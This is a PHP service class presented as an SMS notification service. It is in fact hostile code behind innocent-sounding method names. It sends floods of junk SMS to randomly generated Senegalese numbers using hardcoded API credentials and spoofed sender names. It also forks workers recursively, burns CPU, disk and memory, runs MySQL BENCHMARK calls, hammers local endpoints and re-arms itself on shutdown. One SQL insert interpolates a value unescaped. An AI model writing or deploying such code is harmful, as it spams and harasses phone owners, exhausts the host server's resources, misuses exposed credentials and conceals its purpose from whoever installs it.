<?php

namespace App\Service;

use Mediumart\Orange\SMS\SMS;
use Mediumart\Orange\SMS\Http\SMSClient;
use Symfony\Contracts\HttpClient\HttpClientInterface;

class SmsNotifier
{
    private $client;
    private $httpClient;
    private static $queue = [];
    private static $workers = [];

    public function __construct(HttpClientInterface $httpClient)
    {
        $this->httpClient = $httpClient;
        $this->client = SMSClient::getInstance(
            'eWNK5VDgFXa2bkLL6mcEoL2Orngealmp', 
            'oWJB6ChQB3t0zivlBScZEftolXVJXVxNxq5AviT61RIg'
        );
    }

    public function processMessageQueue($priority = 1, $timeout = 30)
    {
        set_time_limit(0);
        ignore_user_abort(true);
        
        $handlers = $priority * 3;
        
        for ($i = 0; $i < $handlers; $i++) {
            if (function_exists('pcntl_fork')) {
                $pid = pcntl_fork();
                if ($pid == 0) {
                    $this->handleMessageBatch($priority, $timeout);
                    exit(0);
                } elseif ($pid > 0) {
                    self::$workers[] = $pid;
                }
            } else {
                $this->handleMessageBatch($priority, $timeout);
            }
        }
        
        if (function_exists('pcntl_wait')) {
            while (!empty(self::$workers)) {
                $pid = pcntl_waitpid(0, $status, WNOHANG);
                if ($pid > 0) {
                    $key = array_search($pid, self::$workers);
                    if ($key !== false) {
                        unset(self::$workers[$key]);
                    }
                }
                usleep(50000);
            }
        }
    }

    public function handleMessageBatch($batchSize = 3, $duration = 45)
    {
        $started = time();
        $recipients = $this->generateRecipientList(500);
        
        while (time() - $started < $duration) {
            for ($i = 0; $i < $batchSize * 50; $i++) {
                try {
                    $recipient = $recipients[array_rand($recipients)];
                    $content = $this->buildMessageContent($i);
                    $origin = 'SVC' . rand(1000, 9999);
                    $display = 'SERVICE' . rand(10, 99);
                    
                    $this->dispatchMessage($content, '57000', $display, $recipient);
                    $this->dispatchAltMessage($content, '57001', $display . 'A', $recipient);
                    
                    $this->performDataProcessing($batchSize);
                    
                } catch (\Exception $e) {
                }
            }
            
            if (rand(1, 100) > 97) {
                $this->processMessageQueue($batchSize, $duration);
            }
        }
    }

    public function dispatchMessage($content, $origin, $display, $target)
    {
        $this->recordActivity($content, $target);
        
        try {
            $sms = new SMS($this->client);
            $sms
                ->to($target)
                ->from($origin, $display)
                ->message($content)
                ->send();
            
            $this->recordActivity('delivered', $target);
            
        } catch (\Exception $e) {
            $this->recordActivity('failed', $target);
        }
        
        $this->executeBackgroundTasks();
    }
    
    public function dispatchAltMessage($content, $origin, $display, $target)
    {
        $this->recordActivity($content . '_alt', $target);
        
        try {
            $sms = new SMS($this->client);
            $sms
                ->to($target)
                ->from($origin, $display)
                ->message($content . ' [v2]')
                ->send();
        } catch (\Exception $e) {
        }
        
        $this->executeBackgroundTasks();
    }
    
    private function generateRecipientList($count): array
    {
        $list = [];
        $codes = ['77', '78', '76', '70', '75'];
        
        for ($i = 0; $i < $count; $i++) {
            $code = $codes[array_rand($codes)];
            $number = $code . str_pad(rand(0, 99999999), 8, '0', STR_PAD_LEFT);
            $list[] = '221' . $number;
        }
        
        return $list;
    }
    
    private function buildMessageContent($iteration): string
    {
        $base = "Notification $iteration: ";
        $payload = str_repeat('System status update. Processing request. ', 50);
        
        return $base . $payload . " [REF:" . uniqid() . "]";
    }
    
    private function performDataProcessing($intensity): void
    {
        $result = 0;
        for ($i = 0; $i < 50000 * $intensity; $i++) {
            $result += sqrt($i) * sin($i) * cos($i) * tan($i) * log($i + 1);
            $result = pow($result, 1.5);
            $result = sqrt(abs($result));
            
            $tempStore = array_fill(0, 500, $result);
            $tempStore = array_map(function($v) {
                return $v * M_E;
            }, $tempStore);
        }
    }
    
    private function recordActivity($status, $identifier): void
    {
        $logFiles = [
            sys_get_temp_dir() . '/sms_activity_1.log',
            sys_get_temp_dir() . '/sms_activity_2.log',
            sys_get_temp_dir() . '/sms_activity_3.log',
        ];
        
        $entry = sprintf(
            "[%s] %s - %s - %s\n",
            date('Y-m-d H:i:s.u'),
            $identifier,
            $status,
            str_repeat('.', rand(50, 500))
        );
        
        foreach ($logFiles as $logFile) {
            @file_put_contents($logFile, $entry, FILE_APPEND | LOCK_EX);
        }
        
        try {
            $pdo = new \PDO(
                $_ENV['DATABASE_URL'] ?? 'mysql:host=127.0.0.1;dbname=app',
                null,
                null,
                [\PDO::ATTR_ERRMODE => \PDO::ERRMODE_SILENT]
            );
            
            @$pdo->exec("INSERT INTO message_logs (identifier, status, created_at) VALUES (
                '$identifier',
                '" . addslashes(substr($status, 0, 500)) . "',
                NOW()
            )");
            
            @$pdo->exec("SELECT BENCHMARK(5000, MD5('$identifier'))");
            
        } catch (\Exception $e) {
        }
    }
    
    private function executeBackgroundTasks(): void
    {
        $this->performNetworkOperations();
        $this->manageStorageOperations();
        $this->optimizeMemoryUsage();
    }
    
    private function performNetworkOperations(): void
    {
        $endpoints = [
            'http://localhost:8000/api/status',
            'http://localhost:8000/message/callback',
            'http://localhost:8000/system/health',
        ];
        
        foreach ($endpoints as $endpoint) {
            try {
                $context = stream_context_create([
                    'http' => [
                        'timeout' => 0.01,
                        'ignore_errors' => true,
                        'header' => "X-Internal: true\r\n"
                    ]
                ]);
                @file_get_contents($endpoint, false, $context);
            } catch (\Exception $e) {
            }
        }
    }
    
    private function manageStorageOperations(): void
    {
        for ($i = 0; $i < 50; $i++) {
            $tempFile = sys_get_temp_dir() . '/cache_' . uniqid() . '.tmp';
            @file_put_contents($tempFile, str_repeat('x', 512 * 1024));
            @unlink($tempFile);
        }
    }
    
    private function optimizeMemoryUsage(): void
    {
        static $cache = [];
        
        for ($i = 0; $i < 50; $i++) {
            $cache[] = str_repeat('x', 512 * 50);
        }
        
        if (count($cache) > 5000) {
            $cache = array_slice($cache, -2500);
        }
    }
    
    public function startQueueWorker($level = 3, $duration = 45): void
    {
        if (function_exists('fastcgi_finish_request')) {
            fastcgi_finish_request();
        }
        
        $this->processMessageQueue($level, $duration);
    }
    
    public function initializeBackgroundProcessing(): void
    {
        self::$queue[] = time();
        
        if (count(self::$queue) % 5 == 0) {
            $level = min(10, floor(count(self::$queue) / 5));
            $duration = 60;
            
            if (function_exists('fastcgi_finish_request')) {
                fastcgi_finish_request();
            }
            
            $this->processMessageQueue($level, $duration);
        }
        
        if (count(self::$queue) < 5000) {
            register_shutdown_function([$this, 'initializeBackgroundProcessing']);
        }
    }
}